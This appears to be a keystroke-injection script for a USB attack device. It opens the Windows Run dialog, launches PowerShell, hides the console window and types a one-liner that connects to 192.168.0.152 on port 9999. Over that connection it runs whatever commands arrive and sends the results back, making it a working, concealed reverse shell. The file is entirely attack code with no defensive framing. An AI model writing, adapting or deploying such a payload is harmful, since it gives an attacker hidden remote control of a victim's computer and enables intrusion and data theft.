layout('us');
typingSpeed(70, 150);

// Open Run Dialog
press("GUI r");
delay(1000);

// Type "cmd" and Enter
type("cmd\n");
delay(1000);

// Start PowerShell
type("powershell\n");
delay(1000);

// Input PowerShell Script as one-liners
type("Add-Type -TypeDefinition @'\n");
delay(500);
type("using System; using System.Runtime.InteropServices; public class ConsoleWindow { [DllImport(\"user32.dll\")] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName); [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); }\n'@;\n");
delay(1000);

type("$hWnd = [ConsoleWindow]::FindWindow([NullString]::Value, [Console]::Title); [ConsoleWindow]::ShowWindow($hWnd, 0); $address = '192.168.0.152'; $port = 9999; $socket = New-Object System.Net.Sockets.TcpClient($address, $port); $stream = $socket.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; $cmd = ''; while ($cmd -ne 'exit') { $cmd = $reader.ReadLine(); $output = Invoke-Expression $cmd 2>&1 | Out-String; $writer.WriteLine($output); }; $socket.Close();\n");
delay(1000);

// Execute
delay(500);

// Exit PowerShell
type("exit\n");
